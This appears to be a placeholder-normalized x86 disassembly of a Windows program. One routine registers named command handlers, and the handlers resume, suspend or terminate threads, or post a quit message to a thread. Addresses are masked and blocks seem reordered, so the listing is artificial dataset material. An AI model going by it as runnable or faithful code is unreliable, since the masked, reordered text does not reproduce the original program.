pop ebx
sub_42cda0
push ebp
mov ebp esp
push 0xffffffff
push sub_453aea
mov eax [ fs : 0x0 ]
push eax
sub esp 0x138
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x138 ] ax
mov ebx 0x7
push 0x4
mov eax r--data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x140 ] 0x1
mov [ ebp - 0x13c ] sub_42d180
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x128 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0x11c ] cx
push 0x11
mov eax r--data
lea ecx [ ebp - 0x11c ]
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
call sub_401c90
lea eax [ ebp - 0x13c ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push ebx
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x100 ] sub_42d730
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0xe0 ] ax
push 0x17
mov eax r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0xc0 ] cx
push 0x6
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_42d4f0
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x1a
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] dx
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x4c ] sub_42d970
xor eax eax
mov [ ebp - 0x48 ] ax
push 0x4
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x10
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
xor edx edx
push 0x4
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_42dbb0
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x9
xor eax eax
mov [ ebp - 0x68 ] ax
push 0x29
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0xa
call sub_4173f0
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
xor edx edx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
jb r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] cx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x90 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
mov [ ebp - 0xa4 ] cx
jb r-xdata
mov eax [ ebp - 0xa4 ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0xcc ] 0x8
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] ax
jb r-xdata
mov edx [ ebp - 0xc0 ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0xe8 ] 0x8
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xe0 ] dx
jb r-xdata
mov ecx [ ebp - 0xe0 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x108 ] 0x8
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xfc ] cx
jb r-xdata
mov eax [ ebp - 0xfc ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
cmp [ ebp - 0x124 ] 0x8
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x11c ] ax
jb r-xdata
mov edx [ ebp - 0x11c ]
push edx
call sub_43811c
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x138 ]
push ecx
call sub_43811c
add esp 0x4
sub_42d180
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452c68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push 0x10
call sub_438178
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x14 ] ebx
mov edi ebx
mov edi eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ esp + 0x14 ] edi
jmp r-xdata
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov [ esp + 0x18 ] ebx
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x4 ]
jne r-xdata
push eax
call sub_43a187
add esp 0x4
mov [ esp + 0x18 ] eax
mov eax [ eax ]
mov eax [ esi ]
cmp eax [ esi + 0x4 ]
lea edx [ esp + 0x18 ]
sete al
xor ecx ecx
cmp al bl
setne cl
mov ebx edi
dec ecx
and ecx edx
push ecx
call sub_40ff70
add esp 0x4
test al al
je r-xdata
xor ebx ebx
push ebx
lea eax [ esp + 0x50 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x88 ] ebx
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
mov ebx [ edi ]
cmp ebx [ edi + 0x4 ]
je r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ebx 0x4
test edi edi
je r-xdata
mov edx [ esp + 0x4c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
lea edx [ esp + 0x20 ]
push 0x5
push edx
call sub_4374b3
mov edx [ eax + 0xc ]
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add esp 0xc
push edx
mov edx [ eax + 0x8 ]
mov eax [ eax ]
add ecx rw-data
push edx
push ecx
call eax
mov ecx [ rw-data ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x40 ]
mov eax 0x20
push 0x5
push ecx
mov [ edx + rw-data ] ax
call sub_4374b3
mov edx [ ebx + 0xc ]
add esp 0xc
push 0x9
push ecx
push edx
push rw-data
mov edi eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov al 0x1
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edx
push eax
mov eax [ edi ]
call eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
add esp 0xc
push 0x0
lea ecx [ esp + 0x30 ]
mov eax 0x20
push 0x5
push ecx
mov [ edx + esi + 0x40 ] ax
call sub_4374b3
mov edx [ ebx + 0x8 ]
add esp 0xc
push 0x9
push ecx
push edx
push esi
mov edi eax
call sub_408170
add esp 0x4
push eax
call sub_40e950
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
xor eax eax
push edi
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_43811c
add esp 0x4
push eax
call sub_43811c
add esp 0x4
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x8 ]
push ecx
push edx
push eax
mov eax [ edi ]
call eax
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov eax 0x20
add esp 0xc
mov [ edx + esi + 0x40 ] ax
mov ecx [ ebx + 0x10 ]
push ecx
push esi
call sub_424460
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ esp + 0x14 ]
add ebx 0x1c
cmp ebx [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edi edx
jmp r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_42d4f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452c38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x38 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edi
cmp edi [ eax + 0x4 ]
je r-xdata
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
push r--data
push ecx
push edi
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
push 0x0
lea eax [ esp + 0x20 ]
push 0x5
push eax
call sub_4374b3
add esp 0xc
push r--data
push rw-data
mov edi eax
call sub_409de0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push eax
call sub_43a187
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
push edx
mov edx [ edi ]
push ecx
push eax
call edx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add esp 0xc
push r--data
mov ecx 0x20
push ecx
push ebx
push esi
mov [ eax + esi + 0x40 ] cx
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0x8
push ebx
xor edi edi
push edi
push 0x2
call [ OpenThread@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add eax esi
mov edx [ esp + 0x18 ]
add edi 0x1c
mov [ esp + 0x14 ] edi
cmp edi [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push edi
lea edx [ esp + 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x68 ] edi
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x40 ] 0x8
jb r-xdata
cmp esi 0xffffffff
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
xor ecx ecx
mov [ esp + 0x3c ] edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x2c ] cx
jmp r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_43811c
add esp 0x4
push esi
call [ ResumeThread@IAT ]
push esi
call [ CloseHandle@IAT ]
push r--data
push rw-data
call sub_409de0
mov edi [ esp + 0x1c ]
jmp r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
add esp 0x8
sub_42d730
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452c38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x38 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edi
cmp edi [ eax + 0x4 ]
je r-xdata
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
push r--data
push ecx
push edi
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
push 0x0
lea eax [ esp + 0x20 ]
push 0x5
push eax
call sub_4374b3
add esp 0xc
push r--data
push rw-data
mov edi eax
call sub_409de0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push eax
call sub_43a187
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
push edx
mov edx [ edi ]
push ecx
push eax
call edx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add esp 0xc
push r--data
mov ecx 0x20
push ecx
push ebx
push esi
mov [ eax + esi + 0x40 ] cx
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0x8
push ebx
xor edi edi
push edi
push 0x2
call [ OpenThread@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add eax esi
mov edx [ esp + 0x18 ]
add edi 0x1c
mov [ esp + 0x14 ] edi
cmp edi [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push edi
lea edx [ esp + 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x68 ] edi
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x40 ] 0x8
jb r-xdata
cmp esi 0xffffffff
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
xor ecx ecx
mov [ esp + 0x3c ] edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x2c ] cx
jmp r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_43811c
add esp 0x4
push esi
call [ SuspendThread@IAT ]
push esi
call [ CloseHandle@IAT ]
push r--data
push rw-data
call sub_409de0
mov edi [ esp + 0x1c ]
jmp r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
add esp 0x8
sub_42d970
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452c38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x38 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edi
cmp edi [ eax + 0x4 ]
je r-xdata
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
push r--data
push ecx
push edi
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
push 0x0
lea eax [ esp + 0x20 ]
push 0x5
push eax
call sub_4374b3
add esp 0xc
push r--data
push rw-data
mov edi eax
call sub_409de0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push eax
call sub_43a187
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
push edx
mov edx [ edi ]
push ecx
push eax
call edx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add esp 0xc
push r--data
mov ecx 0x20
push ecx
push ebx
push esi
mov [ eax + esi + 0x40 ] cx
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0x8
push ebx
xor edi edi
push edi
push 0x1
call [ OpenThread@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add eax esi
mov edx [ esp + 0x18 ]
add edi 0x1c
mov [ esp + 0x14 ] edi
cmp edi [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push edi
lea edx [ esp + 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x68 ] edi
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x40 ] 0x8
jb r-xdata
cmp esi 0xffffffff
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
xor ecx ecx
mov [ esp + 0x3c ] edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x2c ] cx
jmp r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_43811c
add esp 0x4
push edi
push esi
call [ TerminateThread@IAT ]
push esi
call [ CloseHandle@IAT ]
push r--data
push rw-data
call sub_409de0
mov edi [ esp + 0x1c ]
jmp r-xdata
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
add esp 0x8
sub_42dbb0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_452c38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x38 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edi
cmp edi [ eax + 0x4 ]
je r-xdata
mov al 0x1
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x38 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
push r--data
push ecx
push edi
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
push 0x0
lea eax [ esp + 0x20 ]
push 0x5
push eax
call sub_4374b3
add esp 0xc
push r--data
push rw-data
mov edi eax
call sub_409de0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push eax
call sub_43a187
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x4 ]
add ecx rw-data
test esi esi
je r-xdata
mov eax [ eax + rw-data ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ edi + 0xc ]
mov ecx [ edi + 0x8 ]
push edx
mov edx [ edi ]
push ecx
push eax
call edx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add esp 0xc
push r--data
mov ecx 0x20
push ecx
push ebx
push esi
mov [ eax + esi + 0x40 ] cx
call sub_408170
add esp 0x4
push eax
call sub_409de0
add esp 0x8
xor esi esi
push esi
push esi
push 0x12
push ebx
call [ PostThreadMessageW@IAT ]
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
add eax esi
mov edx [ esp + 0x18 ]
add edi 0x1c
mov [ esp + 0x14 ] edi
cmp edi [ edx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov esi 0x4
push esi
lea edx [ esp + 0x30 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x68 ] esi
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov [ esp + 0x58 ] 0xffffffff
cmp [ esp + 0x40 ] 0x8
jb r-xdata
push r--data
push rw-data
call sub_409de0
mov edi [ esp + 0x1c ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edi [ esp + 0x14 ]
xor ecx ecx
mov [ esp + 0x40 ] 0x7
mov [ esp + 0x3c ] esi
mov [ esp + 0x2c ] cx
jmp r-xdata
mov eax [ esp + 0x2c ]
push eax
call sub_43811c
add esp 0x4
add esp 0x8
push 0xa
mov ecx rw-data
call sub_408340
mov edx [ rw-data ]
mov eax [ edx + 0x4 ]
xor esi esi
test [ eax + rw-data ] 0x6
jne r-xdata
sub_42dde0
push ebp
mov ebp esp
push 0xffffffff
push sub_453a34
mov eax [ fs : 0x0 ]
push eax
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov edi ecx
mov [ ebp - 0x104 ] esi
mov [ ebp - 0x108 ] edi
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0xfc ] ax
mov ebx 0x7
push 0x5
mov eax r--data
lea ecx [ ebp - 0xfc ]
mov [ ebp - 0x104 ] 0x1
mov [ ebp - 0x100 ] sub_42e100
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xec ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov [ ebp - 0xe0 ] cx
push 0x33
mov eax r--data
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0xcc ] ebx
mov [ ebp - 0xd0 ] esi
call sub_401c90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x2
call sub_4173f0
xor edx edx
push 0x5
mov eax r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] sub_42e4a0
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xc0 ] dx
call sub_401c90
mov [ ebp - 0x4 ] 0x3
xor eax eax
mov [ ebp - 0xa4 ] ax
push 0x32
mov eax r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0x94 ] esi
call sub_401c90
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0x4
call sub_4173f0
xor ecx ecx
mov [ ebp - 0x84 ] cx
push ebx
mov eax r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x88 ] sub_42e4b0
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] esi
call sub_401c90
mov [ ebp - 0x4 ] 0x5
xor edx edx
push 0x2d
mov eax r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] dx
call sub_401c90
lea eax [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x6
call sub_4173f0
mov [ ebp - 0x4c ] sub_42e4c0
xor eax eax
mov [ ebp - 0x48 ] ax
push 0x5
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
call sub_401c90
mov [ ebp - 0x4 ] bl
xor ecx ecx
mov [ ebp - 0x2c ] cx
push 0x1b
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
call sub_401c90
lea eax [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x8
call sub_4173f0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] ax
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
xor edx edx
cmp [ ebp - 0x54 ] 0x8
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43811c
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x70 ] 0x8
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x58 ] esi
